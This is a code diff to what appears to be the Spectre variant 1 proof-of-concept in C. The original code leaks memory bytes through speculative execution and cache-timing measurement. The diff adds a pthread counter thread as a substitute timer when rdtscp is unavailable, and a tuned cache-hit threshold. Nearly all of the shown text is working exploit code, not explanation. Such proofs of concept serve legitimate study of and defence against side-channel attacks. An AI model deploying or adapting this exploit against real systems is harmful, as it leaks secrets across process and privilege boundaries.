@@ -1,11 +1,19 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
+#include <pthread.h>
+
 #ifdef _MSC_VER
 #include <intrin.h> /* for rdtscp and clflush */
 #pragma optimize("gt",on)
 #else
 #include <x86intrin.h> /* for rdtscp and clflush */
+#endif
+
+#ifdef PTHREAD
+#define READ_TIMER(x)   counter
+#else
+#define READ_TIMER(x)   __rdtscp(x)
 #endif
 
 /********************************************************************
@@ -45,9 +53,29 @@ void victim_function(size_t x) {
 }
 
 /********************************************************************
+Thread code
+********************************************************************/
+int counter_thread_ended = 0;
+uint32_t counter = 0;
+
+void *counter_function(void *x_void_ptr)
+{
+  while (!counter_thread_ended) {
+    counter++;
+  }
+
+  printf("counter thread finished\n");
+  return NULL;
+}
+
+/********************************************************************
 Analysis code
 ********************************************************************/
+#ifdef PTHREAD
+#define CACHE_HIT_THRESHOLD (60) /* assume cache hit if time <= threshold */
+#else
 #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
+#endif
 
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
@@ -86,9 +114,9 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     for (i = 0; i < 256; i++) {
       mix_i = ((i * 167) + 13) & 255;
       addr = & array2[mix_i * 512];
-      time1 = __rdtscp( & junk); /* READ TIMER */
+      time1 = READ_TIMER(&junk); /* READ TIMER */
       junk = * addr; /* MEMORY ACCESS TO TIME */
-      time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+      time2 = READ_TIMER(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
       if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
         results[mix_i]++; /* cache hit - add +1 to score for this value */
     }
@@ -119,6 +147,17 @@ int main(int argc,
   int i, score[2], len = 40;
   uint8_t value[2];
 
+#ifdef PTHREAD
+  // Setup the counter thread.
+  pthread_t counter_thread;
+
+  if (pthread_create(&counter_thread, NULL, counter_function, NULL)) {
+    fprintf(stderr, "Error creating thread\n");
+    return 1;
+  }
+  // End Setup
+#endif
+
   for (i = 0; i < sizeof(array2); i++)
     array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
   if (argc == 3) {
@@ -138,5 +177,16 @@ int main(int argc,
       printf("(second best: 0x%02X score=%d)", value[1], score[1]);
     printf("\n");
   }
+
+#ifdef PTHREAD
+  // Start: Exit counter thread
+  counter_thread_ended = 1;
+  if (pthread_join(counter_thread, NULL)) {
+    fprintf(stderr, "Error joining thread\n");
+    return 2;
+  }
+  // End: Exit counter thread
+#endif
+
   return (0);
 }
